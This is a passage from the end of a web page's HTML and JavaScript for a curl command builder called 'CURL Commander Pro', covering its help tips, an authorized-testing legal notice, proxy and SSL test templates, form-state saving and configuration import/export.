                        <li>Use rate limiting to avoid overwhelming servers</li>
                        <li>Document all findings and vulnerabilities</li>
                        <li>Follow responsible disclosure practices</li>
                    </ul>
                    <p><strong>Performance Tips:</strong></p>
                    <ul style="margin-left: 1rem; margin-bottom: 1rem;">
                        <li>Use connection reuse with --keepalive-time</li>
                        <li>Enable compression with --compressed</li>
                        <li>Set appropriate timeouts to avoid hanging</li>
                        <li>Use parallel requests carefully with xargs -P</li>
                    </ul>
                    <p><strong>Debugging:</strong></p>
                    <ul style="margin-left: 1rem;">
                        <li>Use -v for detailed request/response information</li>
                        <li>Save headers with -D to analyze server responses</li>
                        <li>Use -w to format output with timing information</li>
                        <li>Save request/response to files for analysis</li>
                    </ul>
                </div>
            </div>

            <div style="background: linear-gradient(135deg, var(--danger) 0%, #dc2626 100%); color: white; padding: 1.5rem; border-radius: 12px; text-align: center;">
                <h4 style="margin-bottom: 0.5rem; display: flex; align-items: center; justify-content: center; gap: 0.5rem;">
                    <i class="fas fa-gavel"></i> Legal Notice
                </h4>
                <p style="font-size: 0.875rem; line-height: 1.5; margin: 0;">
                    This tool is intended for authorized security testing only. Only test applications and systems you own or have explicit written permission to test. 
                    Unauthorized access to computer systems is illegal and may result in criminal prosecution. Always follow responsible disclosure practices.
                </p>
            </div>
        `;
        
        modalBody.innerHTML = helpHTML;
    }

    function showToast(message, type = 'success') {
        const toast = document.getElementById('toast');
        const toastMessage = document.getElementById('toast-message');
        const icon = toast.querySelector('i');
        
        // Reset classes
        toast.className = 'toast';
        
        // Set message and type
        toastMessage.textContent = message;
        toast.classList.add(type);
        
        // Set appropriate icon
        const icons = {
            success: 'fas fa-check-circle',
            warning: 'fas fa-exclamation-triangle',
            error: 'fas fa-times-circle',
            info: 'fas fa-info-circle'
        };
        
        icon.className = icons[type] || icons.success;
        
        toast.classList.add('show');
        
        // Auto-hide after 4 seconds
        setTimeout(() => {
            toast.classList.remove('show');
        }, 4000);
        
        // Add click to dismiss
        toast.onclick = () => toast.classList.remove('show');
    }

    // Keyboard shortcuts
    document.addEventListener('keydown', (e) => {
        // Ctrl/Cmd + Enter to generate command
        if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
            e.preventDefault();
            generateCurl();
            showToast('Command generated! Use Ctrl+C to copy.', 'info');
        }
        
        // Ctrl/Cmd + S to save command
        if ((e.ctrlKey || e.metaKey) && e.key === 's') {
            e.preventDefault();
            saveCommand();
        }
        
        // Escape to close modals
        if (e.key === 'Escape') {
            document.querySelectorAll('.modal.show').forEach(modal => {
                hideModal(modal.id);
            });
        }
        
        // Ctrl/Cmd + ? to open help
        if ((e.ctrlKey || e.metaKey) && (e.key === '?' || e.key === '/')) {
            e.preventDefault();
            showModal('help-modal');
        }
    });

    // Auto-save form state
    function saveFormState() {
        const formState = {
            method: currentMethod,
            url: document.getElementById('url').value,
            body: document.getElementById('body').value,
            headers: Array.from(document.querySelectorAll('.header-row')).map(row => ({
                name: row.querySelector('.header-name').value,
                value: row.querySelector('.header-value').value
            })),
            authType: document.getElementById('auth-type').value,
            userAgent: document.getElementById('user-agent').value,
            timestamp: Date.now()
        };
        
        localStorage.setItem('curlFormState', JSON.stringify(formState));
    }

    function loadFormState() {
        try {
            const formState = JSON.parse(localStorage.getItem('curlFormState') || '{}');
            if (formState.timestamp && Date.now() - formState.timestamp < 24 * 60 * 60 * 1000) { // 24 hours
                // Only restore if saved within last 24 hours
                if (formState.url) document.getElementById('url').value = formState.url;
                if (formState.body) document.getElementById('body').value = formState.body;
                if (formState.authType) document.getElementById('auth-type').value = formState.authType;
                if (formState.userAgent) document.getElementById('user-agent').value = formState.userAgent;
                
                // Restore method
                if (formState.method) {
                    document.querySelectorAll('.method-btn').forEach(btn => btn.classList.remove('active'));
                    const methodBtn = document.querySelector(`[data-method="${formState.method}"]`);
                    if (methodBtn) {
                        methodBtn.classList.add('active');
                        currentMethod = formState.method;
                    }
                }
                
                // Restore headers
                if (formState.headers && formState.headers.length > 0) {
                    const container = document.getElementById('headers-container');
                    container.innerHTML = '';
                    formState.headers.forEach(header => {
                        if (header.name || header.value) {
                            addHeader(header.name, header.value);
                        }
                    });
                }
                
                showToast('Previous session restored!', 'info');
            }
        } catch (e) {
            console.log('No previous session to restore');
        }
    }

    // Save form state periodically
    setInterval(saveFormState, 30000); // Every 30 seconds

    // Save on beforeunload
    window.addEventListener('beforeunload', saveFormState);

    // Add enhanced template configurations
    const enhancedTemplates = {
        'proxy-test': {
            method: 'GET',
            url: 'https://example.com/api/test',
            headers: [['User-Agent', 'Mozilla/5.0 (Security Scanner)']],
            proxy: 'http://127.0.0.1:8080',
            insecure: true,
            verbose: true
        },
        'ssl-test': {
            method: 'GET',
            url: 'https://self-signed.badssl.com/',
            headers: [['User-Agent', 'SSL Test Client']],
            certStatus: true,
            http2: true,
            verbose: true
        }
    };

    // Enhance the applyTemplate function
    const originalApplyTemplate = applyTemplate;
    applyTemplate = function(template) {
        originalApplyTemplate(template);
        
        // Apply enhanced configurations
        const config = enhancedTemplates[template];
        if (config) {
            if (config.proxy) {
                document.getElementById('proxy').value = config.proxy;
            }
            if (config.insecure) {
                document.getElementById('opt-insecure').checked = true;
            }
            if (config.verbose) {
                document.getElementById('opt-verbose').checked = true;
            }
            if (config.certStatus) {
                document.getElementById('opt-cert-status').checked = true;
            }
            if (config.http2) {
                document.getElementById('opt-http2').checked = true;
            }
            
            generateCurl();
        }
    };

    // Load form state on initialization
    setTimeout(loadFormState, 100);

    // Add command validation
    function validateCommand() {
        const url = document.getElementById('url').value.trim();
        const output = document.getElementById('output').value.trim();
        
        const warnings = [];
        
        if (!url) {
            warnings.push('URL is required');
        } else if (!url.match(/^https?:\/\//)) {
            warnings.push('URL should start with http:// or https://');
        }
        
        if (!output) {
            warnings.push('Click "Generate Command" to create CURL command');
        }
        
        if (warnings.length > 0) {
            showToast(warnings.join('. '), 'warning');
            return false;
        }
        
        return true;
    }

    // Enhance copy and download functions with validation
    const originalCopyCommand = copyCommand;
    copyCommand = function() {
        if (validateCommand()) {
            originalCopyCommand();
        }
    };

    const originalDownloadCommand = downloadCommand;
    downloadCommand = function() {
        if (validateCommand()) {
            originalDownloadCommand();
        }
    };

    // Add export/import functionality
    function exportConfiguration() {
        const config = {
            version: '1.0',
            timestamp: new Date().toISOString(),
            method: currentMethod,
            url: document.getElementById('url').value,
            headers: Array.from(document.querySelectorAll('.header-row')).map(row => ({
                name: row.querySelector('.header-name').value,
                value: row.querySelector('.header-value').value
            })),
            body: document.getElementById('body').value,
            authType: document.getElementById('auth-type').value,
            options: {
                verbose: document.getElementById('opt-verbose').checked,
                silent: document.getElementById('opt-silent').checked,
                location: document.getElementById('opt-location').checked,
                insecure: document.getElementById('opt-insecure').checked,
                compressed: document.getElementById('opt-compressed').checked
            }
        };
        
        const blob = new Blob([JSON.stringify(config, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `curl-config-${new Date().toISOString().slice(0, 10)}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        showToast('Configuration exported!', 'success');
    }

    function importConfiguration(event) {
        const file = event.target.files[0];
        if (!file) return;
        
        const reader = new FileReader();
        reader.onload = function(e) {
            try {
                const config = JSON.parse(e.target.result);
                
                if (config.version && config.method) {
                    // Apply configuration
                    document.getElementById('url').value = config.url || '';
                    document.getElementById('body').value = config.body || '';
                    
                    // Set method
                    document.querySelectorAll('.method-btn').forEach(btn => btn.classList.remove('active'));
                    const methodBtn = document.querySelector(`[data-method="${config.method}"]`);
                    if (methodBtn) {
                        methodBtn.classList.add('active');
                        currentMethod = config.method;
                    }
                    
                    // Set headers
                    if (config.headers) {
                        const container = document.getElementById('headers-container');
                        container.innerHTML = '';
                        config.headers.forEach(header => {
                            addHeader(header.name, header.value);
                        });
                    }
                    
                    // Set options
                    if (config.options) {
                        Object.entries(config.options).forEach(([key, value]) => {
                            const element = document.getElementById(`opt-${key}`);
                            if (element) element.checked = value;
                        });
                    }
                    
                    generateCurl();
                    showToast('Configuration imported successfully!', 'success');
                } else {
                    showToast('Invalid configuration file format!', 'error');
                }
            } catch (error) {
                showToast('Failed to parse configuration file!', 'error');
            }
        };
        reader.readAsText(file);
    }

    // Add import/export buttons to the header
    const headerActions = document.querySelector('.header-actions');
    const importBtn = document.createElement('button');
    importBtn.className = 'btn btn-secondary btn-sm';
    importBtn.innerHTML = '<i class="fas fa-upload"></i> Import';
    importBtn.style.position = 'relative';
    importBtn.style.overflow = 'hidden';
    
    const importInput = document.createElement('input');
    importInput.type = 'file';
    importInput.accept = '.json';
    importInput.style.position = 'absolute';
    importInput.style.left = '0';
    importInput.style.top = '0';
    importInput.style.width = '100%';
    importInput.style.height = '100%';
    importInput.style.opacity = '0';
    importInput.style.cursor = 'pointer';
    importInput.addEventListener('change', importConfiguration);
    
    importBtn.appendChild(importInput);
    
    const exportBtn = document.createElement('button');
    exportBtn.className = 'btn btn-secondary btn-sm';
    exportBtn.innerHTML = '<i class="fas fa-download"></i> Export';
    exportBtn.addEventListener('click', exportConfiguration);
    
    headerActions.insertBefore(exportBtn, headerActions.firstChild);
    headerActions.insertBefore(importBtn, headerActions.firstChild);

    console.log(' CURL Commander Pro initialized successfully!');
    console.log(' Tip: Use Ctrl+Enter to generate commands quickly!');
    console.log(' Remember: Only test applications you have permission to test!');
    </script>
</body>
</html>